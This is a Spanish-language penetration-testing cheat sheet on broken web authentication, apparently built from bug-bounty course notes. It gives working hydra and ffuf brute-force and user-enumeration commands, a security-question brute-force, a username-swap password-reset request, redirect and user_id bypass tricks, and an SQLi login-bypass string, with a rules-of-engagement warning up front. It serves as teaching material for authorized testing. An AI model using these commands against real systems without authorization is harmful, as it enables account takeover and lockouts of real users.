---
title: Broken Authentication (login brute-force, user enum, reset/2FA, auth bypass)
slug: broken-authentication
category: techniques
updated: 2026-08-20
summary: "Auth web: hydra http-post-form (F=/S=), user enum por mensaje/timing (ffuf), password-reset logic (security Q brute, username swap), auth bypass (302→200 direct access, param user_id)"
tags: [web, authentication, brute-force, hydra, user-enumeration, password-reset, auth-bypass, session]
sensitive: false
---

# Broken Authentication

## When to use
Cualquier flujo de auth web (login, registro, reset, 2FA, sesión). Buscar:
enumeración de usuarios, brute-force débilmente protegido, lógica de reset rota,
y bypass directo. Hub: [[web-app-attacks]]. Ver también [[password-spray]], [[medusa]].

## ⚠ ROE (leer primero)
Brute-force / spraying / auth-fuzzing = **prohibido por defecto**; solo con
aprobación nombrada + throttle + respetar lockout (bloquear empleados reales = outage).
DoS siempre prohibido. Cracking offline de hashes ya capturados NO cae en este ban.

## Hydra (network login brute-force)
```bash
hydra [-l user|-L users.txt] [-p pass|-P pass.txt] [-t N] [-f] [-s PORT] [-V] service://host
# HTTP basic auth:
hydra -L users.txt -P pass.txt www.example.com http-get
# Login form (F=fail string / S=success código o texto):
hydra -l admin -P pass.txt IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
hydra -l admin -P pass.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
# Otros: ssh/ftp/smtp/imap/mysql/mssql/rdp/vnc. -M targets.txt = multi-host. -x 6:8:aA1 = generar
```
Sacar la cadena params inspeccionando el form (DevTools Network / Burp): path, nombres de campos, incluir tokens CSRF ocultos, y la condición F=/S=.

## User enumeration
Respuestas distintas para user válido vs inválido (login/registro/reset). WordPress lo hace por defecto.
```bash
ffuf -w /opt/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://T/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
Side-channel: **timing** (búsqueda en DB solo para users válidos → respuesta más lenta) enumera aunque el texto sea idéntico. Users válidos → spray dirigido / OSINT.

## Password reset — errores de lógica (aunque haya rate-limit/CAPTCHA)
```bash
# Preguntas de seguridad adivinables (ciudad natal): brute con wordlist de ciudades
cat world-cities.csv | cut -d',' -f1 > cities.txt   # (grep Germany para acotar por OSINT)
ffuf -w cities.txt -u http://T/security_question.php -X POST -b "PHPSESSID=..." \
  -d "security_response=FUZZ" -fr "Incorrect response."
```
**Username swap (hidden param)**: el flujo lleva `username` como parámetro oculto en cada paso. Si el paso final no valida consistencia, cambiarlo resetea la cuenta de OTRO:
```
POST /reset_password.php   password=P@$$w0rd&username=admin    # en vez de tu propio user
```
También: reset token brute-force (baja entropía), 2FA/OTP brute-force (sin rate-limit).

## Auth bypass
- **Acceso directo**: pedir el recurso protegido (`/admin.php`) sin auth. Bug común PHP: `header("Location: index.php")` sin `exit;` → el body protegido igual se envía. Interceptar en Burp y cambiar `302 Found` → `200 OK` para que el navegador lo renderice.
- **Parameter modification**: tras login, redirige a `/admin.php?user_id=183`. Quitar el param → vuelve a login (⇒ es el que autentica). Brute/adivinar el `user_id` del admin → privesc (relacionado con IDOR, ver [[web-app-attacks]]).
- Avanzados (otros módulos): type juggling, SQLi auth bypass (`' or 0=0 #`), logic flaws.

## Gotchas
- Un lockout mal medido bloquea cuentas reales → confirmar umbral antes de spray.
- Enumeración de usuarios no siempre es "vulnerabilidad" (chat/búsqueda la requieren) — reportar como defense-in-depth.

## References
- Relacionado: [[web-app-attacks]], [[password-spray]], [[medusa]], [[api-attacks]], [[web-app-fundamentals]]
- Curso CWES Bug Bounty → 03-WEB → "Fuerza Bruta Login" + "Broken Authentication" (HTB Academy). Notion.
